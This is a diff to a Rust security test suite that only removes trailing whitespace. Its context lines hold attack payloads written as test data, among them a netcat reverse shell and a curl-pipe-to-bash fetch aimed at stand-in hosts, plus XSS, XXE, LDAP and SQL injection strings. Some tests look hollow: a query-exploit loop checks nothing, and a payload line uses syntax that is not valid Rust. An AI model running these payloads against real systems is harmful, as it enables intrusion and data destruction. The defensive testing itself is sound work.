@@ -152,7 +152,7 @@ async fn test_filesystem_path_traversal_protection(ctx: TestContext) -> TestResu
     );
 
     println!("  ✓ All path traversal attacks blocked");
-    
+
     Ok(())
 }
 
@@ -282,13 +282,13 @@ async fn test_sql_injection_protection(ctx: TestContext) -> TestResult {
 
     let factory = EventFactory::new(sources::SHELL_KITTY);
     let event = factory.create_event(event_types::shell::COMMAND_EXECUTED, legitimate_event)?;
-    
+
     ctx.insert_event(&event).await?;
-    
+
     println!("SQL injection protection test completed:");
     println!("  Payloads tested: {}", 10);
     println!("  Rejected payloads: {}", injection_attempts.len());
-    
+
     // All SQL injection attempts should be safely handled
     Ok(())
 }
@@ -306,15 +306,15 @@ async fn test_unicode_normalization_attacks(ctx: TestContext) -> TestResult {
         ("admin\u{FEFF}", "admin with zero-width no-break space"),
         ("admin\u{200C}", "admin with zero-width non-joiner"),
         ("admin\u{200D}", "admin with zero-width joiner"),
-        
+
         // Homograph attacks
         ("аdmin", "cyrillic 'a' instead of latin"),
         ("аdmіn", "multiple cyrillic characters"),
-        
+
         // Case normalization
         ("ADMIN", "uppercase variant"),
         ("AdMiN", "mixed case variant"),
-        
+
         // Combining characters
         ("admin\u{0301}", "admin with combining acute accent"),
         ("a\u{0300}dmin", "a with combining grave accent"),
@@ -330,7 +330,7 @@ async fn test_unicode_normalization_attacks(ctx: TestContext) -> TestResult {
         });
 
         let result = validator.validate_with_rules("auth", "user.login", &event);
-        
+
         match result {
             Ok(_) => {
                 // Check if the payload was normalized
@@ -350,7 +350,7 @@ async fn test_unicode_normalization_attacks(ctx: TestContext) -> TestResult {
     println!("Unicode normalization test results:");
     println!("  Attack variants tested: {}", unicode_attacks.len());
     println!("  Normalization issues: {}", normalization_issues.len());
-    
+
     for issue in &normalization_issues {
         println!("  {}", issue);
     }
@@ -380,7 +380,7 @@ async fn test_null_byte_injection(ctx: TestContext) -> TestResult {
         });
 
         let result = validator.validate_with_rules("fs", "file.uploaded", &event);
-        
+
         match result {
             Ok(_) => {
                 // Check if null byte was properly handled
@@ -417,7 +417,7 @@ async fn test_resource_exhaustion_protection(ctx: TestContext) -> TestResult {
     let mut large_json = json!({
         "data": Vec::<String>::with_capacity(10000)
     });
-    
+
     if let Some(data_array) = large_json.get_mut("data").and_then(|v| v.as_array_mut()) {
         for i in 0..10000 {
             data_array.push(json!(format!("item_{}", i)));
@@ -426,7 +426,7 @@ async fn test_resource_exhaustion_protection(ctx: TestContext) -> TestResult {
 
     let validator = EventValidator::new();
     let large_result = validator.validate_with_rules("test", "large.payload", &large_json);
-    
+
     match large_result {
         Ok(_) => println!("Large JSON accepted (within limits)"),
         Err(e) => println!("Large JSON rejected: {}", e),
@@ -441,7 +441,7 @@ async fn test_resource_exhaustion_protection(ctx: TestContext) -> TestResult {
     }
 
     let deep_result = validator.validate_with_rules("test", "deep.nesting", &deeply_nested);
-    
+
     match deep_result {
         Ok(_) => println!("Deep nesting accepted (vulnerability?)"),
         Err(e) => println!("Deep nesting rejected: {}", e),
@@ -450,13 +450,13 @@ async fn test_resource_exhaustion_protection(ctx: TestContext) -> TestResult {
     // Test 3: Many events in rapid succession
     let start = tokio::time::Instant::now();
     let mut insert_count = 0;
-    
+
     for i in 0..1000 {
         let event = json!({
             "index": i,
             "timestamp": chrono::Utc::now().to_rfc3339()
         });
-        
+
         let factory = EventFactory::new(sources::TEST);
         match factory.create_event(event_types::test::GENERIC, event) {
             Ok(evt) => {
@@ -466,7 +466,7 @@ async fn test_resource_exhaustion_protection(ctx: TestContext) -> TestResult {
             }
             Err(_) => break,
         }
-        
+
         // Check if we're being rate limited
         if start.elapsed() > tokio::time::Duration::from_secs(5) {
             println!("Rate limiting kicked in after {} events", insert_count);
@@ -495,24 +495,24 @@ async fn test_malicious_input_validation(ctx: TestContext) -> TestResult {
         ("| nc attacker.com 4444", "reverse shell"),
         ("$(curl evil.com/script.sh | bash)", "command substitution"),
         ("`id`", "backtick command execution"),
-        
+
         // XSS attempts
         ("<script>alert('xss')</script>", "basic XSS"),
         ("<img src=x onerror=alert(1)>", "img tag XSS"),
         ("javascript:alert(1)", "javascript protocol"),
         ("<iframe src='evil.com'></iframe>", "iframe injection"),
-        
+
         // LDAP injection
         ("*)(uid=*", "LDAP wildcard"),
         ("admin)(|(password=*))", "LDAP filter manipulation"),
-        
+
         // XML injection
         ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "XXE attack"),
-        
+
         // Format string
         ("%x%x%x%x", "format string"),
         ("%n%n%n%n", "format string write"),
-        
+
         // Buffer overflow attempts
         ("A" * 10000, "buffer overflow attempt"),
         ("\x41" * 5000, "hex buffer overflow"),
@@ -541,7 +541,7 @@ async fn test_malicious_input_validation(ctx: TestContext) -> TestResult {
 }
 
 // =============================================================================
-// Query Interface Security Tests  
+// Query Interface Security Tests
 // =============================================================================
 
 /// Test query interface against exploitation attempts
@@ -562,15 +562,15 @@ async fn test_query_interface_exploits(ctx: TestContext) -> TestResult {
         // Time-based attacks
         ("1' AND SLEEP(5)--", "time-based blind SQL"),
         ("1' AND pg_sleep(5)--", "PostgreSQL sleep"),
-        
+
         // Boolean-based blind SQL
         ("1' AND 1=1--", "boolean true condition"),
         ("1' AND 1=2--", "boolean false condition"),
-        
+
         // Union-based attacks
         ("1' UNION SELECT version()--", "version disclosure"),
         ("1' UNION SELECT current_user--", "user disclosure"),
-        
+
         // Stacked queries
         ("1'; INSERT INTO events VALUES (null)--", "stacked query insert"),
         ("1'; DROP TABLE events--", "stacked query drop"),
@@ -578,11 +578,11 @@ async fn test_query_interface_exploits(ctx: TestContext) -> TestResult {
 
     for (query, description) in exploit_queries {
         println!("Testing query exploit: {}", description);
-        
+
         // Simulate query with malicious input
         // In real implementation, this would go through query builders
         // that should prevent SQL injection
-        
+
         // For now, we just ensure the system doesn't crash
         // and malicious queries don't execute
     }
